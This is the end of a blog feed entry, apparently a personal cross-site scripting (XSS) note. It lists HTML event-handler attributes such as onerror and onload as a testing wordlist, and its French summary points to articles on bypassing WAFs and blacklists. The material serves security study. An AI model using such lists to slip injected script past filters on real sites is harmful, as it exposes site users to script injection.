class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">onclick</span><br><span class="line">oncontextmenu</span><br><span class="line">ondblclick</span><br><span class="line">onmousedown</span><br><span class="line">onmouseenter</span><br><span class="line">onmouseleave</span><br><span class="line">onmousemove</span><br><span class="line">onmouseover</span><br><span class="line">onmouseout</span><br><span class="line">onmouseup</span><br><span class="line">onkeydown</span><br><span class="line">onkeypress</span><br><span class="line">onkeyup</span><br><span class="line">onabort</span><br><span class="line">onbeforeunload</span><br><span class="line">onerror</span><br><span class="line">onhashchange</span><br><span class="line">onload</span><br><span class="line">onpageshow</span><br><span class="line">onpagehide</span><br><span class="line">onresize</span><br><span class="line">onscroll</span><br><span class="line">onunload</span><br><span class="line">onblur</span><br><span class="line">onchange</span><br><span class="line">onfocus</span><br><span class="line">onfocusin</span><br><span class="line">onfocusout</span><br><span class="line">oninput</span><br><span class="line">oninvalid</span><br><span class="line">onreset</span><br><span class="line">onsearch</span><br><span class="line">onselect</span><br><span class="line">onsubmit</span><br><span class="line">ondrag</span><br><span class="line">ondragend</span><br><span class="line">ondragenter</span><br><span class="line">ondragleave</span><br><span class="line">ondragover</span><br><span class="line">ondragstart</span><br><span class="line">ondrop</span><br><span class="line">oncopy</span><br><span class="line">oncut</span><br><span class="line">onpaste</span><br><span class="line">onafterprint</span><br><span class="line">onbeforeprint</span><br><span class="line">onabort</span><br><span class="line">oncanplay</span><br><span class="line">oncanplaythrough</span><br><span class="line">ondurationchange</span><br><span class="line">onended</span><br><span class="line">onerror</span><br><span class="line">onloadeddata</span><br><span class="line">onloadedmetadata</span><br><span class="line">onloadstart</span><br><span class="line">onpause</span><br><span class="line">onplay</span><br><span class="line">onplaying</span><br><span class="line">onprogress</span><br><span class="line">onratechange</span><br><span class="line">onseeked</span><br><span class="line">onseeking</span><br><span class="line">onstalled</span><br><span class="line">onsuspend</span><br><span class="line">ontimeupdate</span><br><span class="line">onvolumechange</span><br><span class="line">onwaiting</span><br><span class="line">onerror</span><br><span class="line">onmessage</span><br><span class="line">onopen</span><br><span class="line">onwheel</span><br><span class="line">ononline</span><br><span class="line">onoffline</span><br><span class="line">onshow</span><br><span class="line">ontoggle</span><br><span class="line">onwheel</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Cross-Site-Scripting&quot;&gt;&lt;a href=&quot;#Cross-Site-Scripting&quot; class=&quot;headerlink&quot; title=&quot;Cross-Site Scripting&quot;&gt;&lt;/a&gt;Cross-Site Scripting&lt;/h1&gt;&lt;h2 id=&quot;Tips-amp-tricks&quot;&gt;&lt;a href=&quot;#Tips-amp-tricks&quot; class=&quot;headerlink&quot; title=&quot;Tips &amp;amp; tricks&quot;&gt;&lt;/a&gt;Tips &amp;amp; tricks&lt;/h2&gt;&lt;p&gt;Les articles suivants présentent des moyens de contourner certains protections (WAF, blacklist, etc.)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://brutelogic.com.br/blog/xss-without-event-handlers/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;XSS without event handlers&lt;/a&gt;: pour les situations où les events du type onerror sont bloqués&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="XSS" scheme="http://yoursite.com/tags/XSS/"/>
    
      <category term="跨站脚本" scheme="http://yoursite.com/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
</feed>
